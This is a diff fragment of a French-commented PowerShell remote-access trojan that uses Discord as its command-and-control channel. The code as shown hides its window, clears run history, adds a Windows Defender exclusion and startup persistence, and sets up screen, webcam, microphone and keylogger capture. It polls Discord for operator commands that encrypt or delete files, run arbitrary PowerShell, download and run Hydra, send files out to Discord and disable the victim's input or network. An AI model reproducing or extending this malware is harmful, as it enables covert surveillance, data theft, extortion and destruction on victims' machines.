+            @{ "name" = "!decrypt-files <path>"; "description" = "Déchiffre les fichiers dans le dossier"; "danger" = "Moyen"; "visibility" = "Caché" }
+            @{ "name" = "!delete-files <path>"; "description" = "Supprime les fichiers dans le dossier"; "danger" = "Élevé"; "visibility" = "Caché" }
+            @{ "name" = "!disable-network"; "description" = "Désactive les adaptateurs réseau"; "danger" = "Élevé"; "visibility" = "Visible" }
+            @{ "name" = "!sendhydra"; "description" = "Télécharge et exécute Hydra"; "danger" = "Élevé"; "visibility" = "Caché" }
+            @{ "name" = "!random-mouse"; "description" = "Déplace la souris aléatoirement"; "danger" = "Moyen"; "visibility" = "Visible" }
+            @{ "name" = "!play-sound <url>"; "description" = "Joue un son depuis une URL"; "danger" = "Faible"; "visibility" = "Visible" }
+            @{ "name" = "!fake-bsod"; "description" = "Déclenche un faux BSOD"; "danger" = "Élevé"; "visibility" = "Visible" }
+            @{ "name" = "!soundspam"; "description" = "Joue des bips sonores en boucle"; "danger" = "Moyen"; "visibility" = "Visible" }
+            @{ "name" = "!lock-screen"; "description" = "Verrouille l'écran"; "danger" = "Moyen"; "visibility" = "Visible" }
+            @{ "name" = "!disable-input"; "description" = "Désactive le clavier et la souris"; "danger" = "Élevé"; "visibility" = "Visible" }
+            @{ "name" = "!logoff"; "description" = "Déconnecte l'utilisateur"; "danger" = "Élevé"; "visibility" = "Visible" }
+            @{ "name" = "!execute <command>"; "description" = "Exécute une commande PowerShell"; "danger" = "Élevé"; "visibility" = "Caché" }
+            @{ "name" = "!upload-file <path>"; "description" = "Téléverse un fichier vers Discord"; "danger" = "Moyen"; "visibility" = "Caché" }
+            @{ "name" = "!download-file <url> <path>"; "description" = "Télécharge un fichier depuis une URL"; "danger" = "Moyen"; "visibility" = "Caché" }
+            @{ "name" = "!status"; "description" = "Affiche le statut des jobs"; "danger" = "Faible"; "visibility" = "Caché" }
+            @{ "name" = "!versioncheck"; "description" = "Vérifie la version du script"; "danger" = "Faible"; "visibility" = "Caché" }
+            @{ "name" = "!close"; "description" = "Arrête le script et nettoie"; "danger" = "Faible"; "visibility" = "Caché" }
+            @{ "name" = "!add-persistence"; "description" = "Ajoute la persistance au démarrage"; "danger" = "Élevé"; "visibility" = "Caché" }
         )
         $fields = $commands | ForEach-Object {
-            @{ "name" = $_.name; "value" = "Description: $($_.description)\nDangereuse: $($_.dangerous)\nVisible: $($_.visible)"; "inline" = $false }
+            @{ "name" = $_.name; "value" = "Description: $($_.description)\nDanger: $($_.danger)\nVisibilité: $($_.visibility)"; "inline" = $true }
         }
         Send-Message -Embed @{
             "title" = "Liste des commandes"
-            "description" = "Commandes disponibles pour le bot C2."
+            "description" = "Commandes disponibles pour Discord C2."
             "color" = 0x00FFFF
             "fields" = $fields
             "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
@@ -1038,31 +1132,27 @@ function Get-Help {
     }
 }
 
-# Arrêt du script et suppression de la catégorie
+# Arrêt du script
 function Close-Script {
     try {
         Get-Job | Stop-Job -ErrorAction SilentlyContinue
         Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
-        $headers = @{ 'Authorization' = "Bot $token" }
+        Remove-Item -Path "$env:Temp\*" -Include "Screen.jpg", "Cam.jpg", "mic.wav", "c2_key.txt", "c2_category.txt", "ffmpeg.exe" -Force -ErrorAction SilentlyContinue
+        Remove-DefenderExclusion
+        Remove-Persistence
         $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("Authorization", $headers.Authorization)
-        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
-        $guilds = $response | ConvertFrom-Json
-        $guildID = $guilds[0].id
-        $channels = $wc.DownloadString("https://discord.com/api/v10/guilds/$guildID/channels") | ConvertFrom-Json
-        $categoryChannels = $channels | Where-Object { $_.parent_id -eq $global:CategoryID -or $_.id -eq $global:CategoryID }
-        foreach ($channel in $categoryChannels) {
-            $wc.DownloadString("https://discord.com/api/v10/channels/$($channel.id)") | Out-Null
-            $wc.UploadString("https://discord.com/api/v10/channels/$($channel.id)", "DELETE", "") | Out-Null
-        }
-        Remove-Item -Path "$env:Temp\*" -Include "ffmpeg.exe", "Screen.jpg", "Cam.jpg", "mic.wav", "c2_key.txt" -Force -ErrorAction SilentlyContinue
+        $wc.Headers.Add("Authorization", "Bot $token")
+        $wc.Headers.Add("Content-Type", "application/json")
+        $body = @{} | ConvertTo-Json
+        $wc.UploadString("https://discord.com/api/v10/channels/$global:SessionID", "DELETE", $body) | Out-Null
+        $wc.UploadString("https://discord.com/api/v10/channels/$global:CategoryID", "DELETE", $body) | Out-Null
         Send-Message -Embed @{
             "title" = "Script arrêté"
-            "description" = "Tous les jobs ont été arrêtés et la catégorie Discord a été supprimée."
+            "description" = "Tous les jobs ont été arrêtés, les fichiers temporaires et la catégorie Discord ont été supprimés."
             "color" = 0x00FF00
             "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
         }
-        Write-DebugLog "Script arrêté et catégorie supprimée"
+        Write-DebugLog "Script arrêté et nettoyé"
         exit
     } catch {
         Write-DebugLog "Erreur lors de l'arrêt du script : $_"
@@ -1070,87 +1160,103 @@ function Close-Script {
     }
 }
 
-# ------------------------- INITIALISATION -------------------------
+# ------------------------- BOUCLE PRINCIPALE -------------------------
 
-try {
-    Hide-Window
-    Clear-RunHistory
-    if ($spawnChannels) {
-        New-ChannelCategory
-        New-Channel -name "data"
-        if ($defaultstart) {
+function Main {
+    try {
+        Hide-Window
+        Clear-RunHistory
+        Add-DefenderExclusion
+        Add-Persistence # Ajouter la persistance au démarrage
+        if ($spawnChannels -eq 1) {
+            New-ChannelCategory
+            New-Channel -name "session"
+            $global:SessionID = $global:ChannelID
+            New-Channel -name "screen"
+            $global:ScreenJobID = $global:ChannelID
+            New-Channel -name "webcam"
+            $global:CamJobID = $global:ChannelID
+            New-Channel -name "microphone"
+            $global:MicJobID = $global:ChannelID
+            New-Channel -name "keylogger"
+            $global:KeyJobID = $global:ChannelID
+        }
+        if ($InfoOnConnect -eq 1) {
+            Get-SystemInfo
+        }
+        if ($defaultstart -eq 1) {
             Start-ScreenJob
             Start-CamJob
             Start-AudioJob
             Start-KeyJob
         }
-    }
-    if ($InfoOnConnect) {
-        Get-SystemInfo
-    }
-} catch {
-    Write-DebugLog "Erreur lors de l'initialisation : $_"
-    Send-Error -ErrorMessage "Échec de l'initialisation : $_" -Context "Initialisation"
-}
-
-# ------------------------- BOUCLE PRINCIPALE -------------------------
-
-try {
-    $lastMessageID = $null
-    while ($true) {
-        $headers = @{ 'Authorization' = "Bot $token" }
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("Authorization", $headers.Authorization)
-        $url = "https://discord.com/api/v10/channels/$global:SessionID/messages?limit=1"
-        if ($lastMessageID) {
-            $url += "&after=$lastMessageID"
+        Send-Message -Embed @{
+            "title" = "Bot connecté"
+            "description" = "Le bot C2 est connecté et prêt à recevoir des commandes."
+            "color" = 0x00FF00
+            "fields" = @(
+                @{ "name" = "Nom de l'ordinateur"; "value" = "$env:COMPUTERNAME"; "inline" = $true }
+                @{ "name" = "Version"; "value" = "$version"; "inline" = $true }
+            )
+            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
         }
-        $response = $wc.DownloadString($url)
-        $messages = $response | ConvertFrom-Json
-        if ($messages) {
-            $lastMessageID = $messages[0].id
-            $command = $messages[0].content
-            switch -Regex ($command) {
-                "^!help$" { Get-Help }
-                "^!screenjob$" { Start-ScreenJob }
-                "^!camjob$" { Start-CamJob }
-                "^!micjob$" { Start-AudioJob }
-                "^!keyjob$" { Start-KeyJob }
-                "^!system-info$" { Get-SystemInfo }
-                "^!running-processes$" { Get-RunningProcesses }
-                "^!network-info$" { Get-NetworkInfo }
-                "^!nearbywifi$" { Get-NearbyWifi }
-                "^!encrypt-files\s+(.+)$" { Encrypt-Files -Path $matches[1] }
-                "^!decrypt-files\s+(.+)$" { Decrypt-Files -Path $matches[1] }
-                "^!delete-files\s+(.+)$" { Delete-Files -Path $matches[1] }
-                "^!disable-network$" { Disable-Network }
-                "^!sendhydra$" { Send-Hydra }
-                "^!random-mouse$" { Random-Mouse }
-                "^!play-sound\s+(.+)$" { Play-Sound -Url $matches[1] }
-                "^!fake-bsod$" { Fake-BSOD }
-                "^!soundspam$" { Sound-Spam }
-                "^!lock-screen$" { Lock-Screen }
-                "^!disable-input$" { Disable-Input }
-                "^!logoff$" { Logoff }
-                "^!execute\s+(.+)$" { Execute-Command -Command $matches[1] }
-                "^!upload-file\s+(.+)$" { Upload-File -Path $matches[1] }
-                "^!download-file\s+(.+)\s+(.+)$" { Download-File -Url $matches[1] -Path $matches[2] }
-                "^!status$" { Get-Status }
-                "^!versioncheck$" { Version-Check }
-                "^!close$" { Close-Script }
-                default {
-                    Send-Message -Embed @{
-                        "title" = "Commande inconnue"
-                        "description" = "Utilisez !help pour voir la liste des commandes."
-                        "color" = 0xFF0000
-                        "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
+        while ($true) {
+            $wc = New-Object System.Net.WebClient
+            $wc.Headers.Add("Authorization", "Bot $token")
+            $response = $wc.DownloadString("https://discord.com/api/v10/channels/$global:SessionID/messages?limit=1")
+            $messages = ConvertFrom-Json $response
+            if ($messages) {
+                $msg = $messages[0].content
+                if ($msg -and $messages[0].author.bot -ne $true) {
+                    Write-DebugLog "Message reçu : $msg"
+                    switch -Regex ($msg) {
+                        "^!screenjob$" { Start-ScreenJob }
+                        "^!camjob$" { Start-CamJob }
+                        "^!micjob$" { Start-AudioJob }
+                        "^!keyjob$" { Start-KeyJob }
+                        "^!system-info$" { Get-SystemInfo }
+                        "^!running-processes$" { Get-RunningProcesses }
+                        "^!network-info$" { Get-NetworkInfo }
+                        "^!nearbywifi$" { Get-NearbyWifi }
+                        "^!encrypt-files\s+(.+)$" { Encrypt-Files -Path $matches[1] }
+                        "^!decrypt-files\s+(.+)$" { Decrypt-Files -Path $matches[1] }
+                        "^!delete-files\s+(.+)$" { Delete-Files -Path $matches[1] }
+                        "^!disable-network$" { Disable-Network }
+                        "^!sendhydra$" { Send-Hydra }
+                        "^!random-mouse$" { Start-RandomMouse }
+                        "^!play-sound\s+(.+)$" { Play-Sound -Url $matches[1] }
+                        "^!fake-bsod$" { Start-FakeBSOD }
+                        "^!soundspam$" { Start-SoundSpam }
+                        "^!lock-screen$" { Lock-Screen }
+                        "^!disable-input$" { Disable-Input }
+                        "^!logoff$" { Logoff }
+                        "^!execute\s+(.+)$" { Execute-Command -Command $matches[1] }
+                        "^!upload-file\s+(.+)$" { Upload-File -Path $matches[1] }
+                        "^!download-file\s+(.+)\s+(.+)$" { Download-File -Url $matches[1] -Path $matches[2] }
+                        "^!status$" { Get-Status }
+                        "^!versioncheck$" { Get-VersionCheck }
+                        "^!help$" { Get-Help }
+                        "^!add-persistence$" { Add-Persistence }
+                        "^!close$" { Close-Script }
+                        default { 
+                            Send-Message -Embed @{
+                                "title" = "Commande inconnue"
+                                "description" = "Utilisez !help pour voir la liste des commandes."
+                                "color" = 0xFF0000
+                                "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
+                            }
+                        }
                     }
+                    $wc.UploadString("https://discord.com/api/v10/channels/$global:SessionID/messages/$($messages[0].id)", "DELETE", "{}") | Out-Null
                 }
             }
+            Start-Sleep -Seconds 5
         }
-        Start-Sleep -Seconds 2
+    } catch {
+        Write-DebugLog "Erreur dans la boucle principale : $_"
+        Send-Error -ErrorMessage "Erreur dans la boucle principale : $_" -Context "Main"
     }
-} catch {
-    Write-DebugLog "Erreur dans la boucle principale : $_"
-    Send-Error -ErrorMessage "Erreur dans la boucle principale : $_" -Context "Main-Loop"
 }
+
+# Démarrage du script
+Main
